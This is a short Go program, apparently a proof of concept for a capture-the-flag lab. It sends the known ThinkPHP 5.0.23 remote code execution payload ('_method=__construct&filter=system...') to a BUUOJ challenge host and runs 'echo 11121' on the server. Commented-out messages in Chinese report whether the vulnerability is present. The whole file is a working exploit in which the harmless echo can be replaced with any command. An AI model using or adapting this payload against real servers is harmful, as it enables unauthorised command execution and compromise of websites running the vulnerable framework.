package main

import (
	"fmt"
	"github.com/gocolly/colly"
)

var c = colly.NewCollector()

func Poc(porUrl string) error {
	postData := map[string]string{
		"_method": "__construct&filter=system&method=get&server[REQUEST_METHOD]=echo 11121",
	}
	err := c.Post(porUrl+"/?s=captcha", postData)
	return err
	//if err != nil {
	//	fmt.Println(err)
	//	return "ThinkPHP-V5.0.23 漏洞  不存在** "
	//}
	//return "**** 存在ThinkPHP-V5.0.23 漏洞 ****"
}

func main() {
	fmt.Println(Poc("http://node4.buuoj.cn:27209"))
}
